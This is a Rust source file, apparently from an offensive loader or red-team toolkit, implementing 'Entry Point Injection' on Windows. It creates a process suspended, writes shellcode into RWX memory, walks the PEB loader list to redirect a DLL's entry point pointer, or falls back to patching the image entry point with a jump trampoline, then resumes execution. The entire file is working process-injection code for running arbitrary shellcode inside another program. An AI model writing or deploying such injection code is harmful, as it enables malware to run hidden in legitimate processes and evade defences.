use windows_sys::Win32::System::Threading::{CREATE_SUSPENDED};
use crate::api::{PAGE_EXECUTE_READWRITE, PAGE_READWRITE};

#[cfg(feature = "run_entry_point_injection")]
pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &str) -> Result<(), String> {
    #[cfg(feature = "debug")]
    crate::utils::print_message("Starting Entry Point Injection (EPI)...");

    // 1. Create Process in Suspended State
    let process_info = crate::utils::remote::create_process(target_program, CREATE_SUSPENDED)?;

    #[cfg(feature = "debug")]
    crate::utils::print_message(&format!("Process created. PID: {}", process_info.dwProcessId));

    // 2. Allocate Memory for Shellcode
    let remote_mem = crate::api::alloc_virtual_memory_at(process_info.hProcess, 0, shellcode_len, PAGE_EXECUTE_READWRITE)?;
    
    #[cfg(feature = "debug")]
    crate::utils::print_message(&format!("Allocated memory at: {:#x}", remote_mem));

    // 3. Write Shellcode
    let shellcode_slice = std::slice::from_raw_parts(shellcode_ptr as *const u8, shellcode_len);
    crate::api::write_virtual_memory(process_info.hProcess, remote_mem, shellcode_slice)?;

    // 4. Get PEB Address
    let mut pbi = std::mem::zeroed::<windows_sys::Win32::System::Threading::PROCESS_BASIC_INFORMATION>();
    let mut return_len = 0;
    let status = crate::api::query_information_process(
        process_info.hProcess,
        0, // ProcessBasicInformation
        &mut pbi as *mut _ as *mut _,
        std::mem::size_of::<windows_sys::Win32::System::Threading::PROCESS_BASIC_INFORMATION>() as u32,
        &mut return_len
    )?;

    if status < 0 {
        return Err(format!("NtQueryInformationProcess failed: {:#x}", status));
    }

    let peb_base = pbi.PebBaseAddress as usize;
    #[cfg(feature = "debug")]
    crate::utils::print_message(&format!("PEB Base: {:#x}", peb_base));

    // 5. Walk Ldr to find a DLL (kernelbase.dll or ntdll.dll)
    // Note: In a suspended process created via CreateProcess, Ldr might not be fully initialized.
    // However, we'll try to find a loaded module. If Ldr is empty, we fallback to ImageBase EntryPoint.
    
    let mut ldr_pointer: usize = 0;
    // PEB.Ldr is at offset 0x18 (x64)
    crate::api::read_virtual_memory(process_info.hProcess, peb_base + 0x18, std::slice::from_raw_parts_mut(&mut ldr_pointer as *mut _ as *mut u8, 8))?;

    let mut target_entry_point_addr: usize = 0;
    let mut found_dll = false;

    if ldr_pointer != 0 {
        // Read PEB_LDR_DATA.InLoadOrderModuleList (offset 0x10)
        let mut module_list_head: usize = 0; // Flink
        crate::api::read_virtual_memory(process_info.hProcess, ldr_pointer + 0x10, std::slice::from_raw_parts_mut(&mut module_list_head as *mut _ as *mut u8, 8))?;

        let mut current_entry = module_list_head;
        
        // Loop limit to prevent infinite loop
        for _ in 0..20 {
            if current_entry == 0 || current_entry == ldr_pointer + 0x10 {
                break;
            }

            // Read LDR_DATA_TABLE_ENTRY
            // 0x00: InLoadOrderLinks
            // 0x30: DllBase
            // 0x38: EntryPoint
            // 0x48: FullDllName (UNICODE_STRING)
            // 0x58: BaseDllName (UNICODE_STRING)

            // Read BaseDllName.Buffer (offset 0x58 + 8 = 0x60) and Length (0x58)
            // UNICODE_STRING: Length (2), MaximumLength (2), Buffer (8)
            let mut unicode_str_buf = [0u8; 16]; // Length, MaxLen, Pad, Buffer
            crate::api::read_virtual_memory(process_info.hProcess, current_entry + 0x58, &mut unicode_str_buf)?;
            
            let base_dll_name_len = u16::from_le_bytes([unicode_str_buf[0], unicode_str_buf[1]]);
            let base_dll_name_ptr = usize::from_le_bytes(unicode_str_buf[8..16].try_into().unwrap());

            if base_dll_name_len > 0 && base_dll_name_ptr != 0 {
                let mut name_buf = vec![0u8; base_dll_name_len as usize];
                crate::api::read_virtual_memory(process_info.hProcess, base_dll_name_ptr, &mut name_buf)?;
                let name = String::from_utf16_lossy(unsafe { std::slice::from_raw_parts(name_buf.as_ptr() as *const u16, base_dll_name_len as usize / 2) });
                
                #[cfg(feature = "debug")]
                crate::utils::print_message(&format!("Found module: {}", name));

                if name.to_lowercase().contains("kernelbase.dll") || name.to_lowercase().contains("ntdll.dll") {
                    // Found target DLL
                    target_entry_point_addr = current_entry + 0x38;
                    found_dll = true;
                    #[cfg(feature = "debug")]
                    crate::utils::print_message(&format!("Targeting DLL: {}", name));
                    break;
                }
            }

            // Move to next entry (Flink at offset 0x00)
            let mut next_entry: usize = 0;
            crate::api::read_virtual_memory(process_info.hProcess, current_entry, std::slice::from_raw_parts_mut(&mut next_entry as *mut _ as *mut u8, 8))?;
            current_entry = next_entry;
        }
    }

    if !found_dll {
        #[cfg(feature = "debug")]
        crate::utils::print_message("Could not find suitable DLL in Ldr. Fallback to Image EntryPoint.");
        
        // Fallback: Get ImageBase and parse PE header
        // PEB.ImageBaseAddress is at offset 0x10 (x64)
        let mut image_base: usize = 0;
        crate::api::read_virtual_memory(process_info.hProcess, peb_base + 0x10, std::slice::from_raw_parts_mut(&mut image_base as *mut _ as *mut u8, 8))?;
        
        // Read DOS Header
        let mut dos_header = [0u8; 64];
        crate::api::read_virtual_memory(process_info.hProcess, image_base, &mut dos_header)?;
        let e_lfanew = i32::from_le_bytes(dos_header[60..64].try_into().unwrap()) as usize;
        
        // Read NT Headers (OptionalHeader is at +24 from NT Headers start)
        // AddressOfEntryPoint is at offset 16 in OptionalHeader (Standard Fields)
        // NT Headers = Signature (4) + FileHeader (20) + OptionalHeader
        // AddressOfEntryPoint is at: image_base + e_lfanew + 4 + 20 + 16
        let entry_point_offset_addr = image_base + e_lfanew + 24 + 16;
        
        // We need to write to the header, so we need to change protection?
        // Headers are usually ReadOnly? No, usually ReadOnly in memory.
        // Let's change protection just in case.
        crate::api::protect_virtual_memory(process_info.hProcess, entry_point_offset_addr, 8, PAGE_READWRITE)?;
        
        // Wait, AddressOfEntryPoint in PE header is an RVA (u32).
        // We need to overwrite the *code* at the EntryPoint?
        // EPI says "hijacking loaded dll's entry points". It overwrites the *pointer* in the LDR table.
        // If we fallback to Image EntryPoint, we can't overwrite the LDR table entry if we didn't find it.
        // But we can overwrite the *code* at the EntryPoint.
        // Read AddressOfEntryPoint RVA
        let mut entry_point_rva: u32 = 0;
        crate::api::read_virtual_memory(process_info.hProcess, entry_point_offset_addr, std::slice::from_raw_parts_mut(&mut entry_point_rva as *mut _ as *mut u8, 4))?;
        
        let entry_point_addr = image_base + entry_point_rva as usize;
        
        // Write a trampoline or the shellcode itself at the EntryPoint?
        // If shellcode fits? EntryPoint usually points to code.
        // Better: Write a JMP to our shellcode at the EntryPoint.
        // JMP [RIP+0] -> 0xFF 0x25 0x00 0x00 0x00 0x00 + Address (14 bytes)
        
        #[cfg(feature = "debug")]
        crate::utils::print_message(&format!("Patching Image EntryPoint at: {:#x}", entry_point_addr));
        
        crate::api::protect_virtual_memory(process_info.hProcess, entry_point_addr, 16, PAGE_EXECUTE_READWRITE)?;
        
        let mut trampoline = vec![
            0x48, 0xb8, // mov rax, ...
        ];
        trampoline.extend_from_slice(&remote_mem.to_le_bytes());
        trampoline.extend_from_slice(&[0xff, 0xe0]); // jmp rax
        
        crate::api::write_virtual_memory(process_info.hProcess, entry_point_addr, &trampoline)?;
        
    } else {
        // 6. Overwrite EntryPoint in LDR_DATA_TABLE_ENTRY
        // This is the pointer in the struct, not the code itself.
        // So we just write our shellcode address to this pointer.
        
        #[cfg(feature = "debug")]
        crate::utils::print_message(&format!("Overwriting LDR EntryPoint pointer at: {:#x}", target_entry_point_addr));
        
        // LDR data is usually RW.
        crate::api::write_virtual_memory(process_info.hProcess, target_entry_point_addr, &remote_mem.to_le_bytes())?;
    }

    // 7. Resume Thread
    crate::api::resume_thread(process_info.hThread)?;

    #[cfg(feature = "debug")]
    crate::utils::print_message("Injection completed.");

    Ok(())
}
